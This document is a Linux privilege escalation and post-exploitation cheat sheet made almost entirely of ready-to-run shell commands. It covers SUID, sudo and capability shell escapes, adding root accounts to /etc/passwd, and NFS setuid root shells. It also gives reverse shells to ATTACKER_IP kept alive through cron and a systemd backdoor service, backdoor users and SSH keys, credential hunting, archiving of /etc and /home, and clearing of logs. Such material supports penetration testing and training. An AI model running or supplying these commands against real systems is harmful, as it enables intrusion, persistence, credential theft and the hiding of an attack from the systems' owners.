# Linux Privilege Escalation and Post-Exploitation Cheat Sheet

## Initial Reconnaissance

### System Information
```bash
# System and kernel information
uname -a
cat /proc/version
cat /etc/issue
lsb_release -a
hostname

# Architecture information
arch
```

### User Information
```bash
# Current user context
id
whoami
groups

# Other users on the system
cat /etc/passwd | cut -d: -f1
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1 }' # List all superusers
awk -F: '($3 == "0") {print}' /etc/passwd # List all root accounts
last # Recent logins
w # Current logged-in users

# Command history
history
cat ~/.bash_history
```

### Network Information
```bash
# Network interfaces and configuration
ifconfig -a
ip a
/sbin/route
netstat -antup # Active network connections
netstat -tulpn # Listening ports
ss -tulpn # Alternative to netstat

# DNS configuration
cat /etc/resolv.conf

# ARP table
arp -a

# Hosts file
cat /etc/hosts

# Firewall rules
iptables -L
firewall-cmd --list-all
```

### Process Information
```bash
# Process list
ps aux
ps -ef
top
pstree

# Running services
systemctl list-units --type=service --state=running
service --status-all
```

## Automated Enumeration Tools
```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# Linux Smart Enumeration (LSE)
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
chmod +x lse.sh
./lse.sh

# Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# pspy - unprivileged Linux process snooping
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
chmod +x pspy64
./pspy64
```

## Kernel Exploits

### Identify Kernel Version
```bash
uname -a
cat /proc/version
```

### Vulnerability Research Steps
1. Note the kernel version from `uname -a` output
2. Check for known vulnerabilities in that kernel version
3. Use searchsploit to find potential exploits:
   ```bash
   searchsploit linux kernel [version]
   ```
4. Common kernel exploits:
   - DirtyCow (CVE-2016-5195) - Linux Kernel 2.6.22 < 3.9
   - pwnkit (CVE-2021-4034) - Polkit pkexec
   - Dirty Pipe (CVE-2022-0847) - Linux Kernel 5.8 - 5.16.11

## SUID/SGID Binaries

### Finding SUID & SGID binaries
```bash
# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Find SGID binaries
find / -perm -g=s -type f 2>/dev/null

# Alternative methods
find / -perm -4000 -type f 2>/dev/null  # SUID
find / -perm -2000 -type f 2>/dev/null  # SGID
```

### Common SUID Binaries to Check
```
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/traceroute6
/usr/bin/su
/usr/sbin/pppd
/usr/bin/nmap (older versions)
```

### GTFOBins Check
Check if found binaries are listed in [GTFOBins](https://gtfobins.github.io/).

Examples of SUID binary exploitation:
```bash
# Example: Using find with SUID
./find . -exec /bin/sh -p \; -quit

# Example: Using cp with SUID to copy /etc/passwd
./cp /etc/passwd /tmp/
./cp /dev/null /etc/passwd
echo "root2:x:0:0:root:/root:/bin/bash" > /tmp/passwd
./cp /tmp/passwd /etc/passwd

# Example: Using vim with SUID
./vim -c ':!/bin/sh'
```

## Sudo Privileges

### Check Sudo Permissions
```bash
sudo -l
```

### Exploit Sudo Rules
For each command the user can run as sudo, check [GTFOBins](https://gtfobins.github.io/) for exploitation methods.

Example exploits:
```bash
# Example: If allowed to run vim as sudo
sudo vim -c ':!/bin/sh'

# Example: If allowed to run find as sudo
sudo find . -exec /bin/sh \; -quit

# Example: If allowed to run python as sudo
sudo python -c 'import os; os.system("/bin/sh")'

# Example: If allowed to run all commands as sudo with NOPASSWD
sudo su -
```

### Sudoers File Misconfigurations
```bash
# If you can read the sudoers file:
cat /etc/sudoers

# Check for world-writable sudoers file (rare but possible):
ls -la /etc/sudoers
```

## Cron Jobs

### List Scheduled Cron Jobs
```bash
# System-wide crontab
cat /etc/crontab

# User crontabs
crontab -l
ls -la /var/spool/cron/crontabs/

# Check other cron directories
ls -la /etc/cron*
```

### Look for Exploitable Jobs
Check if any cron job:
1. Runs a script that you can modify
2. Runs a script that uses wildcards
3. Has incorrect permissions

Example exploitation:
```bash
# If you identify a world-writable script executed by root cron job
echo '#!/bin/bash' > /path/to/script
echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> /path/to/script
chmod +x /path/to/script
```

## PATH Exploitation

### Check Current PATH
```bash
echo $PATH
```

### Create Malicious Binary in PATH
If a script or program executes another program without specifying its absolute path:

```bash
# Create malicious version of the called program
echo '#!/bin/bash' > /tmp/program_name
echo 'id; /bin/bash' >> /tmp/program_name
chmod +x /tmp/program_name

# Add /tmp to the beginning of your PATH
export PATH=/tmp:$PATH
```

## NFS Shares

### Check NFS Configuration
```bash
# Check exports
cat /etc/exports

# Look for "no_root_squash" option
```

### Exploiting NFS with no_root_squash
From your attacker machine:
```bash
# Show available NFS shares
showmount -e target_ip

# Create mount point
mkdir /tmp/nfs

# Mount the share
mount -o rw target_ip:/shared/folder /tmp/nfs

# Create setuid root shell
echo '#!/bin/bash' > /tmp/nfs/shell.c
echo 'int main() { setuid(0); setgid(0); system("/bin/bash"); return 0; }' >> /tmp/nfs/shell.c
gcc /tmp/nfs/shell.c -o /tmp/nfs/shell
chmod u+s /tmp/nfs/shell
```

Then on the target, execute `/shared/folder/shell` for a root shell.

## Weak File Permissions

### Check Sensitive File Permissions
```bash
# World-writable files
find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" 2>/dev/null

# World-writable directories
find / -writable -type d -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" 2>/dev/null

# Files owned by current user
find / -user $(whoami) 2>/dev/null

# Critical files permissions
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/sudoers
ls -la /etc/ssh/sshd_config
```

### Exploiting Writable /etc/passwd
```bash
# Generate password hash
openssl passwd -1 -salt xyz password123

# Add new root user to /etc/passwd
echo "rootuser:$1$xyz$zfGfmT7X/Bw0OMhDJ.3.h/:0:0:root:/root:/bin/bash" >> /etc/passwd
```

## Weak Service Configurations

### Check Service Configurations
```bash
# SSH config
cat /etc/ssh/sshd_config

# Apache config
cat /etc/apache2/apache2.conf

# MySQL config
cat /etc/mysql/my.cnf

# Look for passwords in config files
grep -r "password" /etc/ 2>/dev/null
```

### Check Web Server Directories
```bash
# Check common web roots
ls -la /var/www/
ls -la /var/www/html/
ls -la /srv/www/
```

## Credentials Hunting

### Search for Credentials in Files
```bash
# Common locations
grep -r "password" /var/www/ 2>/dev/null
grep -r "password" /opt/ 2>/dev/null
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /home/ 2>/dev/null

# History files
find / -name "*_history" -type f 2>/dev/null
find / -name ".bash_history" -type f 2>/dev/null

# SSH private keys
find / -name "id_rsa" 2>/dev/null
```

### Check for Hardcoded Credentials
```bash
# User configuration files
grep -r "PASSWORD" /home/ 2>/dev/null
grep -r "PASS" /home/ 2>/dev/null

# Search for environment variables
env | grep -i pass
```

### Check for Remembered Authentication
```bash
# .ssh directories
find / -name ".ssh" -type d 2>/dev/null

# Check for .netrc files
find / -name ".netrc" -type f 2>/dev/null
```

## Capabilities

### List Capabilities
```bash
# List all capabilities on the system
getcap -r / 2>/dev/null
```

### Exploiting Capabilities
```bash
# Example: Python with cap_setuid capability
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Example: Perl with cap_setuid capability
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/sh";'
```

## Docker Group Membership

### Check Docker Group
```bash
groups
grep docker /etc/group
```

### Exploit Docker Group
```bash
# If you are a member of the docker group:
docker run -v /:/mnt -it alpine chroot /mnt sh
```

## LXC/LXD Group Membership

### Check LXC/LXD Group
```bash
groups
grep "lxc\|lxd" /etc/group
```

### Exploit LXD Group
```bash
# If you are a member of the lxd group:
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
```

## Post-Exploitation

### Maintaining Access

#### Create a Backdoor User
```bash
# Add a new user with root privileges
useradd -m -s /bin/bash -G sudo backdoor
passwd backdoor

# Or directly modify /etc/passwd if writable
echo "backdoor:x:0:0:backdoor:/home/backdoor:/bin/bash" >> /etc/passwd
echo "backdoor:password123" | chpasswd
```

#### SSH Backdoor
```bash
# Generate SSH key pair on your attacker machine
ssh-keygen -f ./backdoor_key

# Add your public key to authorized_keys on target
mkdir -p ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

#### Create a Persistent Reverse Shell
```bash
# In crontab
(crontab -l 2>/dev/null; echo "* * * * * bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'") | crontab -

# In systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor Service

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
systemctl start backdoor.service
```

### Information Gathering

#### Extract Password Hashes
```bash
cat /etc/shadow
```

#### Dump Important Files
```bash
# SSH keys and configs
tar -czf /tmp/ssh.tar.gz /etc/ssh/
# /etc configuration
tar -czf /tmp/etc.tar.gz /etc/
# User home directories
tar -czf /tmp/home.tar.gz /home/
```

#### Network Analysis
```bash
# Check established connections
netstat -antp

# Check for internal services not exposed externally
netstat -anlp | grep LISTEN

# Scan internal network
for ip in $(seq 1 254); do ping -c 1 10.0.0.$ip | grep "64 bytes"; done
```

### Lateral Movement

#### Find Other Systems in Network
```bash
# ARP cache
arp -a

# Check the routing table
route -n

# Look for SSH known_hosts
cat ~/.ssh/known_hosts
```

#### Password Reuse
```bash
# Try found credentials on other systems
for ip in $(cat /tmp/ip_list.txt); do sshpass -p 'found_password' ssh user@$ip; done
```

### Covering Tracks

#### Clear Command History
```bash
history -c
rm ~/.bash_history
```

#### Clear Logs
```bash
# Common log files
echo > /var/log/auth.log
echo > /var/log/messages
echo > /var/log/syslog
echo > /var/log/apache2/access.log
echo > /var/log/apache2/error.log
```

#### Remove Temporary Files
```bash
rm -rf /tmp/*
```

## Helpful One-Liners

```bash
# Find all world-writeable directories
find / -writable -type d 2>/dev/null

# Find all world-executable files
find / -perm -o+x -type f 2>/dev/null

# Find all SUID/SGID files
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

# Analyze file for potential passwords
grep -l -i "pass\|password\|pwd" $(find /var/www -type f -name "*.php" 2>/dev/null)

# Check for files modified in last 10 minutes
find / -mmin -10 -type f -not -path "/proc/*" 2>/dev/null

# Upload files when no upload tools are available
base64 -w 0 file_to_upload.txt | xclip -selection clipboard
# On target: 
echo "base64_string" | base64 -d > file_name
```

## Important Tools to Upload

```
- Reverse shell scripts (Python, Perl, Bash, PHP)
- Statically compiled version of netcat
- Chisel (for tunneling)
- Socat (for port forwarding and bind shells)
- LinPEAS and other enumeration scripts
- pspy (for monitoring processes)
```

## Final Notes

1. Always look for the unexpected - custom applications, non-standard configurations
2. Combine techniques when necessary
3. Be aware of your footprint on the target system
4. Document your findings for reporting
5. Don't forget to check for lateral movement opportunities
